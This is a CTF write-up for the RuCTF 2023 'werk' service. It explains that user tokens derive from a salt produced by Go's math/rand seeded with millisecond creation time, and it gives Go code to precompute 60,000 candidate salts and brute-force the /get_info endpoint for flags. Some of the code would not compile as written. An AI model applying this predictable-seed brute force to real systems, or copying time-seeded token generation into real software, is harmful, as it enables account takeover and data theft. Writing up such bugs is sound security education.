# RuCTF 2023 | werk

## Description

The service is pretty simple: it allows users to register in it and get registration info (user's field "payment-info" is an attack data).
And with registration it returns some "lucky numbers" - lottery analog for users.

## Vuln

User access token are generated by standard go rand on creation, with seed on creation time milliseconds:
```golang
rand.Seed(time.Now().UnixMilli())

luckyNumbers := RandomLuckyNumbers() // just 4 rand calls
salt := RandomString(20) // rand is index in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

// ...

return GetBaseHash(username + salt)
```

Username can be taken from CS, as public flag id. So we need to brutforce salt.

There are 60000 salts for every round's registrations, which can be computed by this code:
```golang
intrestedMinuteStart := time.Now().UnixMilli()
salts := make(map[string]bool)

for mss := 0; mss < 60000; mss++ {
    rand.Seed(intrestedMinuteStart + mss)
    _ := RandomLuckyNumbers()
    nextSalt := RandomString(20)
    salts[nextSalt] = true
}
```

After this, we can make attempts to /get_info and flag from payment-info
```golang
func bruteforce(username string) {
    for salt := range salts {
        // attempt to /get_info with token = sha1(username + salt)

        values := map[string]string{"username": username, "token": GetBaseToken(username + salt)}
        jsonData, err := json.Marshal(values)

        resp, err := http.Get(fmt.Sprintf("http:%s/get_info", victimAddress), bytes.NewBuffer(jsonData))
        if err != nil {
            continue
        }
        defer resp.Body.Close()

        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            continue
        }

        fmt.Println(string(body))
    }
}
```
